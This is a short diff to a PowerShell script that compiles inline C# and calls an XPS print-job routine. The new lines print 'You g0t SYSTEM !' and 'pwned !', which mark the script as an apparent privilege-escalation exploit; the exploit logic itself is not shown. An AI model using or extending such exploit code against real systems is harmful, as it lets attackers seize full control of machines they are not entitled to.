@@ -101,6 +101,8 @@ WAIT_FAILED = -1
 
 "@
 add-type -typeDefinition $mycode
-[XPS.XpsPrint]::StartPrintJob()
-echo "[+] done!"
+try { [XPS.XpsPrint]::StartPrintJob() }
+catch { "[+] You g0t SYSTEM !" }
+echo "[+] pwned !"
+echo ""
 exit
